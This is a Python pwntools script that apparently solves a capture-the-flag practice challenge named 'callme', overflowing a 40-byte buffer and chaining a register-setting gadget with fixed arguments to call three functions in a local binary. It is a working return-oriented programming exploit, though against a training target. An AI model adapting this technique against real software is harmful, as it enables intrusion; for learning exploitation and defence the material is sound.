#!/usr/bin/env python

from pwn import *

basepayload = b"A" * 40
p = process("./callme")
setreg = p64(0x40093c)
db = p64(0xdeadbeefdeadbeef)
cb = p64(0xcafebabecafebabe)
df = p64(0xd00df00dd00df00d)

payload = basepayload
# first call
payload += setreg
payload += db
payload += cb
payload += df
payload += p64(0x400720)
# 2nd
payload += setreg
payload += db
payload += cb
payload += df
payload += p64(0x400740) 
# 3rd
payload += setreg
payload += db
payload += cb
payload += df
payload += p64(0x4006f0)

p.sendline(payload)
print(p.recvall().decode())
p.close()
